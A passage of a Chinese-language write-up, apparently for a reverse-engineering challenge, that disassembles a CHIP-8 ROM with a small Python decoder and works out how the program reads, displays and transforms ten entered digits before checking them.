class="hljs-number">0</span>] == <span class="hljs-string">'8'</span>:</span><br><span class="line">       VX = <span class="hljs-string">"V"</span> + t[<span class="hljs-number">1</span>]</span><br><span class="line">       VY = <span class="hljs-string">"V"</span> + t[<span class="hljs-number">2</span>]</span><br><span class="line">       <span class="hljs-keyword">if</span> t[-<span class="hljs-number">1</span>] == <span class="hljs-string">'0'</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(VX + <span class="hljs-string">" = "</span> + VY)</span><br><span class="line">       <span class="hljs-keyword">elif</span> t[-<span class="hljs-number">1</span>] == <span class="hljs-string">'1'</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(VX + <span class="hljs-string">" = "</span> + VX + <span class="hljs-string">" | "</span> + VY)</span><br><span class="line">       <span class="hljs-keyword">elif</span> t[-<span class="hljs-number">1</span>] == <span class="hljs-string">'2'</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(VX + <span class="hljs-string">" = "</span> + VX + <span class="hljs-string">" &amp; "</span> + VY)</span><br><span class="line">       <span class="hljs-keyword">elif</span> t[-<span class="hljs-number">1</span>] == <span class="hljs-string">'3'</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(VX + <span class="hljs-string">" = "</span> + VX + <span class="hljs-string">" ^ "</span> + VY)</span><br><span class="line">       <span class="hljs-keyword">elif</span> t[-<span class="hljs-number">1</span>] == <span class="hljs-string">'4'</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(VX + <span class="hljs-string">" += "</span> + VY, <span class="hljs-string">" set VF=1 if VX&gt;=255"</span>)</span><br><span class="line">       <span class="hljs-keyword">elif</span> t[-<span class="hljs-number">1</span>] == <span class="hljs-string">'5'</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(VX + <span class="hljs-string">" -= "</span> + VY, <span class="hljs-string">" set VF=0 if VX&lt;=0"</span>)</span><br><span class="line">       <span class="hljs-keyword">elif</span> t[-<span class="hljs-number">1</span>] == <span class="hljs-string">'6'</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(VX + <span class="hljs-string">" &gt;&gt;= 1"</span>, <span class="hljs-string">" the last one to VF"</span>)</span><br><span class="line">       <span class="hljs-keyword">elif</span> t[-<span class="hljs-number">1</span>] == <span class="hljs-string">'7'</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(VX + <span class="hljs-string">" = "</span> + VY + <span class="hljs-string">" - "</span> + VX, <span class="hljs-string">" set VF=0 if VX&amp;lt;0"</span>)</span><br><span class="line">       <span class="hljs-keyword">elif</span> t[-<span class="hljs-number">1</span>] == <span class="hljs-string">'e'</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(VX + <span class="hljs-string">" &lt;&lt;= 1"</span>, <span class="hljs-string">" the first one to VF"</span>)</span><br><span class="line">       <span class="hljs-keyword">else</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(<span class="hljs-string">"Invalid instruction: "</span> + t)</span><br><span class="line">   <span class="hljs-keyword">elif</span> t[<span class="hljs-number">0</span>] == <span class="hljs-string">'9'</span>:</span><br><span class="line">       <span class="hljs-built_in">print</span>(<span class="hljs-string">"Skips the next instruction if V"</span> + t[<span class="hljs-number">1</span>] + <span class="hljs-string">" not equals V"</span> + t[<span class="hljs-number">2</span>])</span><br><span class="line">   <span class="hljs-keyword">elif</span> t[<span class="hljs-number">0</span>] == <span class="hljs-string">'a'</span>:</span><br><span class="line">       <span class="hljs-built_in">print</span>(<span class="hljs-string">"set I = "</span> + t[<span class="hljs-number">1</span>:])</span><br><span class="line">   <span class="hljs-keyword">elif</span> t[<span class="hljs-number">0</span>] == <span class="hljs-string">'b'</span>:</span><br><span class="line">       <span class="hljs-built_in">print</span>(<span class="hljs-string">"jmp V0+"</span> + t[<span class="hljs-number">1</span>:])</span><br><span class="line">   <span class="hljs-keyword">elif</span> t[<span class="hljs-number">0</span>] == <span class="hljs-string">'c'</span>:</span><br><span class="line">       <span class="hljs-built_in">print</span>(<span class="hljs-string">"V"</span> + t[<span class="hljs-number">1</span>] + <span class="hljs-string">"=rand()&amp;"</span> + t[<span class="hljs-number">2</span>:])</span><br><span class="line">   <span class="hljs-keyword">elif</span> t[<span class="hljs-number">0</span>] == <span class="hljs-string">'d'</span>:</span><br><span class="line">       <span class="hljs-built_in">print</span>(<span class="hljs-string">"display at (V"</span> + t[<span class="hljs-number">1</span>] + <span class="hljs-string">","</span> + <span class="hljs-string">"V"</span> + t[<span class="hljs-number">2</span>] + <span class="hljs-string">") for "</span> + t[<span class="hljs-number">3</span>] + <span class="hljs-string">"rows"</span>)</span><br><span class="line">   <span class="hljs-keyword">elif</span> t[<span class="hljs-number">0</span>] == <span class="hljs-string">'e'</span>:</span><br><span class="line">       <span class="hljs-built_in">print</span>(<span class="hljs-string">"something about buttons"</span>)</span><br><span class="line">   <span class="hljs-keyword">elif</span> t[<span class="hljs-number">0</span>] == <span class="hljs-string">'f'</span>:</span><br><span class="line">       <span class="hljs-keyword">if</span> t[<span class="hljs-number">2</span>:] == <span class="hljs-string">'29'</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(<span class="hljs-string">"set I="</span> + <span class="hljs-string">"V"</span> + t[<span class="hljs-number">1</span>])</span><br><span class="line">       <span class="hljs-keyword">elif</span> t[<span class="hljs-number">2</span>:] == <span class="hljs-string">"0a"</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(<span class="hljs-string">"set V"</span> + t[<span class="hljs-number">1</span>] + <span class="hljs-string">" = button pressed"</span>)</span><br><span class="line">       <span class="hljs-keyword">elif</span> t[<span class="hljs-number">2</span>:] == <span class="hljs-string">"55"</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(<span class="hljs-string">"store V0-V"</span> + t[<span class="hljs-number">1</span>] + <span class="hljs-string">" to addr start at I"</span>)</span><br><span class="line">       <span class="hljs-keyword">elif</span> t[<span class="hljs-number">2</span>:] == <span class="hljs-string">"65"</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(<span class="hljs-string">"store addr start at I to V0-V"</span> + t[<span class="hljs-number">1</span>])</span><br><span class="line">       <span class="hljs-keyword">elif</span> t[<span class="hljs-number">2</span>:] == <span class="hljs-string">"33"</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(<span class="hljs-string">"set BCD(V"</span> + t[<span class="hljs-number">1</span>] + <span class="hljs-string">")"</span>)</span><br><span class="line">       <span class="hljs-keyword">else</span>:</span><br><span class="line">           <span class="hljs-built_in">print</span>(t[<span class="hljs-number">2</span>:])</span><br><span class="line">   <span class="hljs-keyword">else</span>:</span><br><span class="line">       <span class="hljs-built_in">print</span>(<span class="hljs-string">"Invalid instruction: "</span> + t)</span><br></pre></td></tr></tbody></table></figure><p>解析之后根据程序的运行流程看一下大概过程，读取按键在屏幕上指定位置显示出来，直到10位都读取完，然后进行一些判断，错误就会显示dead，正确直接退出程序，不会有显示。然后详细看一下程序</p><p>程序开始一个跳转从2ce开始，根据chip8内存的排布规律，可执行代码从200开始</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>ce   Ve = <span class="hljs-number">10</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>d<span class="hljs-number">0</span>   set I=Ve</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>d<span class="hljs-number">2</span>   store V<span class="hljs-number">0</span>-Ve to addr start at I</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>d<span class="hljs-number">4</span>   Vf = <span class="hljs-number">03</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>d<span class="hljs-number">6</span>   Ve += Vf  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>d<span class="hljs-number">8</span>   call <span class="hljs-number">928</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>da   V<span class="hljs-number">0</span> = Vf</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>dc   V<span class="hljs-number">1</span> = <span class="hljs-number">05</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>de   V<span class="hljs-number">2</span> = <span class="hljs-number">08</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>e<span class="hljs-number">0</span>   V<span class="hljs-number">3</span> = V<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>e<span class="hljs-number">2</span>   set I=Ve</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>e<span class="hljs-number">4</span>   store V<span class="hljs-number">0</span>-Ve to addr start at I</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>e<span class="hljs-number">6</span>   Vf = <span class="hljs-number">03</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>e<span class="hljs-number">8</span>   Ve += Vf  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>ea   V<span class="hljs-number">0</span> = V<span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>ec   V<span class="hljs-number">1</span> = V<span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>ee   V<span class="hljs-number">2</span> = V<span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">2</span>f<span class="hljs-number">0</span>   call <span class="hljs-number">938</span></span><br></pre></td></tr></tbody></table></figure><p>首先是10个这样的过程用于输入和显示</p><p>其中928用于读取输入，记录按键信息</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">928</span>   V<span class="hljs-number">0</span> = ff</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">92</span>a   set V<span class="hljs-number">0</span> = button pressed</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">92</span>c   Vf = <span class="hljs-number">03</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">92</span>e   Ve -= Vf  set VF=<span class="hljs-number">0</span> if VX&lt;=<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">930</span>   Vf = V<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">932</span>   set I=Ve</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">934</span>   store addr start at I to V<span class="hljs-number">0</span>-Ve</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">936</span>   Returns from a subroutine</span><br></pre></td></tr></tbody></table></figure><p>938用于输出到显示屏上</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">938</span>   V<span class="hljs-number">5</span> = V<span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">93</span>a   V<span class="hljs-number">4</span> = V<span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">93</span>c   V<span class="hljs-number">3</span> = V<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">93</span>e   V<span class="hljs-number">6</span> = <span class="hljs-number">00</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">940</span>   set BCD(V<span class="hljs-number">5</span>)</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">942</span>   store addr start at I to V<span class="hljs-number">0</span>-V<span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">944</span>   set I=V<span class="hljs-number">5</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">946</span>   display at (V<span class="hljs-number">3</span>,V<span class="hljs-number">4</span>) for <span class="hljs-number">5</span>rows</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">948</span>   V<span class="hljs-number">6</span> = V<span class="hljs-number">6</span> | Vf</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">94</span>a   Vf = <span class="hljs-number">03</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">94</span>c   Ve -= Vf  set VF=<span class="hljs-number">0</span> if VX&amp;lt;<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">94</span>e   Vf = V<span class="hljs-number">6</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">950</span>   set I=Ve</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">952</span>   store addr start at I to V<span class="hljs-number">0</span>-Ve</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">954</span>   Returns from a subroutine</span><br></pre></td></tr></tbody></table></figure><p>经过10次这样的操作之后，显示屏上显示出10个输入的数，分别存储在寄存器V0到V9中，接下来对这些输入的数值进行处理</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">436</span>   Va = Vf</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">438</span>   Va = V<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">43</span>a   Vb = V<span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">43</span>c   Vc = <span class="hljs-number">02</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">43</span>e   Vb += Vc  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">440</span>   Va = Vb</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">442</span>   V<span class="hljs-number">0</span> = Va</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">444</span>   Va = V<span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">446</span>   Vb = V<span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">448</span>   Vc = <span class="hljs-number">01</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">44</span>a   Vb += Vc  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">44</span>c   Va = Vb</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">44</span>e   V<span class="hljs-number">1</span> = Va</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">450</span>   Va = V<span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">452</span>   Vb = V<span class="hljs-number">2</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">454</span>   Vc = <span class="hljs-number">01</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">456</span>   Vb += Vc  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">458</span>   Vc = <span class="hljs-number">01</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">45</span>a   Vb = Vb ^ Vc</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">45</span>c   Va = Vb</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">45</span>e   V<span class="hljs-number">2</span> = Va</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">460</span>   Va = V<span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">462</span>   Vb = V<span class="hljs-number">3</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">464</span>   Vc = <span class="hljs-number">03</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">466</span>   Vb += Vc  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">468</span>   Va = Vb</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">46</span>a   V<span class="hljs-number">3</span> = Va</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">46</span>c   Va = V<span class="hljs-number">4</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">46</span>e   Vb = V<span class="hljs-number">4</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">470</span>   Vc = <span class="hljs-number">02</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">472</span>   Vb += Vc  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">474</span>   Va = Vb</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">476</span>   V<span class="hljs-number">4</span> = Va</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">478</span>   Va = V<span class="hljs-number">5</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">47</span>a   Vb = V<span class="hljs-number">5</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">47</span>c   Vc = <span class="hljs-number">02</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">47</span>e   Vb = Vb ^ Vc</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">480</span>   Vc = <span class="hljs-number">01</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">482</span>   Vb += Vc  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">484</span>   Va = Vb</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">486</span>   V<span class="hljs-number">5</span> = Va</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">488</span>   Va = V<span class="hljs-number">6</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">48</span>a   Vb = V<span class="hljs-number">6</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">48</span>c   Vc = V<span class="hljs-number">6</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">48</span>e   Vb += Vc  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">490</span>   Va = Vb</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">492</span>   V<span class="hljs-number">6</span> = Va</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">494</span>   Va = V<span class="hljs-number">7</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">496</span>   Vb = V<span class="hljs-number">7</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">498</span>   Vc = <span class="hljs-number">01</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">49</span>a   Vb += Vc  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">49</span>c   Va = Vb</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">49</span>e   V<span class="hljs-number">7</span> = Va</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>a<span class="hljs-number">0</span>   Va = V<span class="hljs-number">8</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>a<span class="hljs-number">2</span>   Vb = V<span class="hljs-number">8</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>a<span class="hljs-number">4</span>   Vc = <span class="hljs-number">01</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>a<span class="hljs-number">6</span>   Vb = Vb ^ Vc</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>a<span class="hljs-number">8</span>   Vc = <span class="hljs-number">01</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>aa   Vb += Vc  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ac   Va = Vb</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ae   V<span class="hljs-number">8</span> = Va</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>b<span class="hljs-number">0</span>   Va = V<span class="hljs-number">9</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>b<span class="hljs-number">2</span>   Vb = V<span class="hljs-number">9</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>b<span class="hljs-number">4</span>   Vc = <span class="hljs-number">02</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>b<span class="hljs-number">6</span>   Vb += Vc  set VF=<span class="hljs-number">1</span> if VX&gt;=<span class="hljs-number">255</span></span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>b<span class="hljs-number">8</span>   Va = Vb</span><br><span class="line"><span class="hljs-attribute">addr</span>:<span class="hljs-number">0</span>x<span class="hljs-number">4</span>ba   V<span class="hljs-number">9</span> = Va</span><br></pre></td></tr></tbody></table></figure><p>就是如下操作</p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">f[<span class="hljs-number">0</span>]+=<span class="hljs-number">2</span></span><br><span class="line">f[<span class="hljs-number">1</span>]+=<span class="hljs-number">1</span></span><br><span class="line">f[<span class="hljs-number">2</span>]=(f[<span class="hljs-number">2</span>]+<span class="hljs-number">1</span>)^<span class="hljs-number">1</span></span><br><span class="line">f[<span class="hljs-number">3</span>]+=<span class="hljs-number">3</span></span><br><span class="line">f[<span class="hljs-number">4</span>]+=<span class="hljs-number">2</span></span><br><span class="line">f[<span class="hljs-number">5</span>]=(f[<span class="hljs-number">5</span>]^<span class="hljs-number">2</span>)+<span class="hljs-number">1</span></span><br><span class="line">f[<span class="hljs-number">6</span>]=<span class="hljs-number">2</span>*f[<span class="hljs-number">6</span>]</span><br><span class="line">f[<span class="hljs-number">7</span>]+=<span class="hljs-number">1</span></span><br><span class="line">f[<span class="hljs-number">8</span>]=(f[<span class="hljs-number">8</span>]^<span class="hljs-number">1</span>)+<span class="hljs-number">1</span></span><br><span class="line">f[<span class="hljs-number">9</span>]+=<span class="hljs-number">2</span></span><br></pre></td></tr></tbody></table></figure><p>接下来是10个方程</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 